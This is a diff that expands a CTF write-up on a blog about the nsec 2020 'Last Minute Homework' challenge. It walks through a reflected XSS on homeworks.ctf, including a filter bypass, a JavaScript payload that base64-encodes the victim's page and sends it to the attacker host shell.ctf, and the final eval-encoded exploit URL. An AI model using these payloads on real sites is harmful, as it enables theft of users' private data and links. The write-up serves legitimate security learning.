@@ -9,17 +9,17 @@
 	<meta name="msapplication-TileColor" content="#494f5c">
 <meta itemprop="name" content="Last Minute Homework - nsec 2020 CTF">
 <meta itemprop="description" content="Intro A Severity High student&rsquo;s homework is going to be late if we don&rsquo;t help them steal the smart kid&rsquo;s assignment which has already been submitted to the online homework submission site at homeworks.ctf.
-Additionally, the student tells us that they have managed to install a backdoor of sorts on the smart kid&rsquo;s machine which we could leverage in our homework heist.
+Additionally, the student tells us that they have managed to install some malware on the smart kid&rsquo;s machine (hosted at homeworks-malware.ctf) which we could leverage in our homework heist.
 The Application Looking quickly at homeworks.ctf show a fairly limited page consisting of:">
 <meta itemprop="datePublished" content="2020-05-18T00:00:00&#43;00:00" />
 <meta itemprop="dateModified" content="2020-05-18T00:00:00&#43;00:00" />
-<meta itemprop="wordCount" content="116">
+<meta itemprop="wordCount" content="526">
 
 
 
 <meta itemprop="keywords" content="ctf,XSS,nsec," /><meta property="og:title" content="Last Minute Homework - nsec 2020 CTF" />
 <meta property="og:description" content="Intro A Severity High student&rsquo;s homework is going to be late if we don&rsquo;t help them steal the smart kid&rsquo;s assignment which has already been submitted to the online homework submission site at homeworks.ctf.
-Additionally, the student tells us that they have managed to install a backdoor of sorts on the smart kid&rsquo;s machine which we could leverage in our homework heist.
+Additionally, the student tells us that they have managed to install some malware on the smart kid&rsquo;s machine (hosted at homeworks-malware.ctf) which we could leverage in our homework heist.
 The Application Looking quickly at homeworks.ctf show a fairly limited page consisting of:" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://stargravy.ca/posts/last-minute-homework/" />
@@ -28,7 +28,7 @@ The Application Looking quickly at homeworks.ctf show a fairly limited page cons
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Last Minute Homework - nsec 2020 CTF"/>
 <meta name="twitter:description" content="Intro A Severity High student&rsquo;s homework is going to be late if we don&rsquo;t help them steal the smart kid&rsquo;s assignment which has already been submitted to the online homework submission site at homeworks.ctf.
-Additionally, the student tells us that they have managed to install a backdoor of sorts on the smart kid&rsquo;s machine which we could leverage in our homework heist.
+Additionally, the student tells us that they have managed to install some malware on the smart kid&rsquo;s machine (hosted at homeworks-malware.ctf) which we could leverage in our homework heist.
 The Application Looking quickly at homeworks.ctf show a fairly limited page consisting of:"/>
 
 	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
@@ -76,7 +76,7 @@ The Application Looking quickly at homeworks.ctf show a fairly limited page cons
 			<div class="content">
 				<h2 id="intro">Intro<a href="#intro" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
 <p>A Severity High student&rsquo;s homework is going to be late if we don&rsquo;t help them steal the smart kid&rsquo;s assignment which has already been submitted to the online homework submission site at <code>homeworks.ctf</code>.</p>
-<p>Additionally, the student tells us that they have managed to install a backdoor of sorts on the smart kid&rsquo;s machine which we could leverage in our homework heist.</p>
+<p>Additionally, the student tells us that they have managed to install some malware on the smart kid&rsquo;s machine (hosted at <code>homeworks-malware.ctf</code>) which we could leverage in our homework heist.</p>
 <h2 id="the-application">The Application<a href="#the-application" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
 <p>Looking quickly at <code>homeworks.ctf</code> show a fairly limited page consisting of:</p>
 <ul>
@@ -87,10 +87,57 @@ The Application Looking quickly at homeworks.ctf show a fairly limited page cons
 <figure>
     <img src="/last-minute-homework-1.png"
          alt="homework check"/> <figcaption>
-            <p>the homework check page</p>
+            <p>The homework check page, showing our &ldquo;secret link&rdquo;</p>
         </figcaption>
 </figure>
 
+<p>The malware mentioned in the forum post is reachable at <code>homworks-malware.ctf</code> and consists of a simple form which lets us make requests to the <code>homeworks.ctf</code> site <em>as</em> the smart kid&rsquo;s browser.</p>
+<h2 id="homework-heist">Homework Heist<a href="#homework-heist" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>We initially thought we were going to have to find a way to point these browser requests to the attacker machine at <code>shell.ctf</code>, to gather their IP address, and use X-Forwarded-For headers, or other means, to appear authenticated as the smart kid. This path didn&rsquo;t pan out.</p>
+<p>We continued to investigate and found a reflected cross-site scripting (XSS) vulnerability which could be triggered via the page&rsquo;s url/path.
+There is a very limited attempt at filtering this sort of attack, as the first set of <code>&lt;&gt;</code> characters, but that is circumvented. Additionally, using any unencoded <code>/</code> characters results in a 404.</p>
+<p>For example, the legitimate homework check page sits at:</p>
+<pre><code>http://homeworks.ctf/check/Severity High
+</code></pre><p>A reflected XSS payload can be triggered with the following request:</p>
+<pre><code>http://homeworks.ctf/check/Severity High&lt;&gt;&lt;img src=x onerror=alert(1)&gt;
+</code></pre><p>With this XSS we can execute code in the context of the smart kid victim&rsquo;s browser using the provided malware. 
+We know that the homework can be found via the personalized &ldquo;secret link&rdquo; from the /check page, so we have to construct a payload which can collect that information and send it to a listener on our attacker machine at <code>shell.ctf</code>.</p>
+<p>The payload we want to trigger against the smart kid&rsquo;s browser is:</p>
+<pre><code>var text = btoa(document.documentElement.innerHTML); 
+req = new XMLHttpRequest();
+req.open(&quot;GET&quot;,&quot;http://shell.ctf:8000/&quot;+text);
+req.send();
+</code></pre><p>This will save the entirety of the /check page (base64 encoded) into a variable, and use it as the path in a request the attacker web server at <code>shell.ctf</code>, which will allow us to intercept the smart kid&rsquo;s &ldquo;secret link&rdquo; and grab his homework.</p>
+<p>To make this more manageable to send, the payload is base64 encoded and passed via <code>eval()</code>, making the final reflected XSS link payload:</p>
+<pre><code>http://homeworks.ctf/homeworks/check/Severity High&lt;&gt;&lt;img src=x onerror=eval(atob(&quot;dmFyIHRleHQ9YnRvYShkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuaW5uZXJIVE1MKTsgcmVxID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7cmVxLm9wZW4oIkdFVCIsImh0dHA6Ly9zaGVsbC5jdGY6ODAwMC8iK3RleHQpO3JlcS5zZW5kKCk7&quot;))&gt;
+</code></pre><p>We can enter this as our input to the malware at <code>homeworks-malware.ctf</code>, triggering the XSS and sending a request with the info we need to a listener waiting on <code>shell.ctf</code>.</p>
+<figure>
+    <img src="/last-minute-homework-2.png"
+         alt="malware"/> <figcaption>
+            <p>Triggering our payload via the malware.</p>
+        </figcaption>
+</figure>
+
+<figure>
+    <img src="/last-minute-homework-3.png"
+         alt="catching secrets"/> <figcaption>
+            <p>Catching the base64 encoded document on <code>shell.ctf</code></p>
+        </figcaption>
+</figure>
+
+<p>Decoding the request received gives us the smart kid&rsquo;s personalized &ldquo;secret link&rdquo; to his homework submission. Visiting the link yields both the homework, and our flag.</p>
+<figure>
+    <img src="/last-minute-homework-4.png"
+         alt="homework"/> <figcaption>
+            <p>Capturing our flag.</p>
+        </figcaption>
+</figure>
+
+<hr>
+<p>Further reading:</p>
+<ul>
+<li>PortSwigger has a good page on exploiting XSS to steal information, including a couple of labs : <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting">https://portswigger.net/web-security/cross-site-scripting/exploiting</a></li>
+</ul>
 
 			</div>
 			<hr class="post-end">
@@ -99,7 +146,7 @@ The Application Looking quickly at homeworks.ctf show a fairly limited page cons
 				<p>
 					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://stargravy.ca/tags/ctf">ctf</a></span><span class="tag"><a href="https://stargravy.ca/tags/xss">XSS</a></span><span class="tag"><a href="https://stargravy.ca/tags/nsec">nsec</a></span>
 				</p>
-				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>116 Words</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>526 Words</p>
 				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-05-17 21:00 -0300</p>
 			</footer>
 		</article>
@@ -109,6 +156,7 @@ The Application Looking quickly at homeworks.ctf show a fairly limited page cons
   <ul>
     <li><a href="#intro">Intro</a></li>
     <li><a href="#the-application">The Application</a></li>
+    <li><a href="#homework-heist">Homework Heist</a></li>
   </ul>
 </nav>
 		</aside>
